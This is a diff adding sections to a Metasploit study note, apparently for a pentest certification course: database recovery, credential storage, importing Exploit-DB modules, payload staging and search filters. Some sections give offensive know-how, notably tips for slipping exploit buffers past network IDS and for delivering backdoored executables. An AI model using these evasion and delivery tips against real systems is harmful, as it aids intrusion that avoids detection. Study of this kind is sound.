@@ -52,8 +52,6 @@ msf6 > db_status
 
 All base files live in `/usr/share/metasploit-framework/`. The hidden `~/.msf4/` directory stores personal config, session data, and custom modules.
 
-## Core Usage
-
 ### Module search and selection
 
 ```bash
@@ -110,8 +108,6 @@ set LHOST tun0
 set LPORT 4444
 run -j                      # run as background job
 ```
-
-## Common Use Cases
 
 ### Scanning and enumeration
 
@@ -318,3 +314,133 @@ set PROXIES HTTP:127.0.0.1:8080
 
 - CPTS Metasploit Framework module (HTB Academy)
 - Source files: `/raw/assets/courses/CPTS/9. Metasploit Framework/`
+
+## DB recovery and manual credential entry
+
+DELTA vs the Database sections already on this page.
+
+When `db_status` fails or init claims the DB is configured while it is not (common after a
+framework update breaks schema sync):
+
+```sh
+sudo msfdb status                 # what state postgres + the msf DB are actually in
+msfdb reinit                      # drop and rebuild the workspace DB
+sudo cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
+sudo systemctl restart postgresql
+msfconsole -q -x 'db_status'
+```
+
+`creds add` writes manually captured credentials into the workspace so they are queryable with
+`creds`, joinable against hosts/services, and survive a session change (complements
+`targets/<eng>/loot.md`):
+
+```sh
+creds add user:admin password:'P@ss' realm:workgroup   # user+pass(+realm)
+creds add user:admin ntlm:<LM>:<NT>                    # NTLM hash pair
+creds add user:sshadmin ssh-key:/path/to/id_rsa        # SSH key
+creds add user:svc hash:<md5> jtr:md5                  # non-replayable hash, john format
+creds add password:'password without username'         # standalone password
+```
+
+Sweeping a found cred against DB hosts is then a `creds`/`hosts` join instead of re-reading notes.
+
+<!-- promoted-slug: msf-db-recovery-creds-add -->
+
+## Exploit-code-level IDS/IPS evasion
+
+DELTA vs the payload-side evasion (encoders, templates, archives, packers) already on this page:
+making the exploit traffic itself less signature-shaped.
+
+For custom/port BoF modules, network IDS matches the exploit buffer, not the payload:
+
+- **Vary the offset**: hardcoding `Offset` in a target entry pins the buffer shape; jitter it or
+  compute it per-run so the hex pattern never matches a stored signature twice.
+- **Avoid obvious NOP sleds**: `\x90` runs where the shellcode lands are the most-signatured
+  bytes in a BoF stream; use a restricted-character sled (`\x01`, `\x02` + trailing `\x2c`-style
+  jumps) instead where badchars allow.
+- Test the final stream against a sandbox before firing once at the client; a signature hit may
+  be the only attempt the IPS allows.
+
+Related msfvenom detail: `-x template.exe -k` keeps the original program running in its own
+thread, but launching the backdoored exe from a console pops a visible payload window that stays
+open for the session's life; prefer double-click delivery contexts.
+
+See [[binary-exploitation]] for buffer construction.
+
+<!-- promoted-slug: msf-exploit-code-ids-evasion -->
+
+## Importing an Exploit-DB module that local MSF lacks
+
+DELTA vs the single custom-module tip on this page and [[searchsploit]]: the full import path.
+
+When `msfconsole search <product>` comes up empty, an MSF-format module may still exist in
+Exploit-DB. Find it with searchsploit and keep only `.rb` files (Python standalones cannot load
+into msfconsole; not every `.rb` is module-compatible either, check the source for
+`class MetasploitModule`):
+
+```sh
+searchsploit -t <product> --exclude=".py"     # .rb entries only
+```
+
+Install (snake_case name, alphanumerics + underscores only, never dashes):
+
+```sh
+cp 9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/<product>_cmd_injection.rb
+msfconsole -m /usr/share/metasploit-framework/modules/   # load path at startup
+# or from a running console: loadpath /usr/share/metasploit-framework/modules/
+# or: reload_all
+```
+
+`~/.msf4/modules/` mirrors the same tree for personal modules; `mkdir -p` the matching
+`exploits/<os>/<service>/` structure if it does not exist.
+
+Porting a non-module exploit (Python/PHP PoC) into one: copy the closest existing module in the
+same directory as boilerplate, then adjust the `include` mixins (HttpClient, PhpEXE,
+FileDropper, Report, see docs.metasploit.com/api) and swap `register_options` entries (e.g.
+`OptPath` for a wordlist instead of `OptString` for a single password). Ruby modules use hard
+tabs.
+
+<!-- promoted-slug: msf-module-import-exploitdb -->
+
+## Payload anatomy: singles, stagers, stages, middle stagers
+
+DELTA vs the staged-vs-stageless table already on this page: how the pieces actually compose.
+
+- **Singles** (`windows/shell_reverse_tcp`): full shellcode inline, self-contained, more stable,
+  but large; some exploit buffers cannot fit them.
+- **Stagers** (`reverse_tcp`, `bind_tcp`, `reverse_https`): tiny stage0 shellcode that only
+  establishes the channel. MSF auto-picks the best stager and falls back to a less preferred one
+  when one fails. NX-aware stagers are bigger (VirtualAlloc) but DEP-safe; default is NX.
+- **Stages** (meterpreter, vncinject, `shell`): downloaded over the stager's channel; no size
+  limit, that is how Meterpreter fits.
+- **Middle stager**: large stages auto-insert an intermediate stager, because the initial
+  stager's single `recv()` cannot pull a full stage in one read; the middle stager does the full
+  download. Explains the second "sending stage" size burst on the wire.
+
+Practical read: a stage payload dying mid-transfer means the middle stager handshake failed
+(bad routing, egress filtering on the callback port), not a broken exploit; try a stageless
+(`_reverse_tcp` solid) payload to cut the extra round trips.
+
+<!-- promoted-slug: msf-payload-staging-theory -->
+
+## Search refinements beyond keyword filters
+
+DELTA vs the basic `search type:/platform:/cve:` filters already on this page.
+
+```sh
+search check:true type:exploit       # only modules with a check method (safe-first triage)
+search -S eternalblue                # regex substring filter on results
+search -u check:true eternalblue     # auto-`use` when exactly one module matches
+search -o results.csv ms17_010       # dump results to CSV for the report/notes
+search cve:2009 -s name              # sort ascending by column (-r reverses)
+search aka:eternalblue               # by also-known-as name
+search edb:<id>                      # by Exploit-DB reference
+```
+
+Notes:
+- `check:true` is the pre-fire quality gate: pairs with `check` before `run` on production targets.
+- `-u` avoids the index-roundtrip when a search is unambiguous (indices reset on every new search).
+- Rank accepts comparisons (`rank:gte400`), useful for filtering manual-ranked modules out of
+  noisy product searches.
+
+<!-- promoted-slug: msf-search-refinement -->
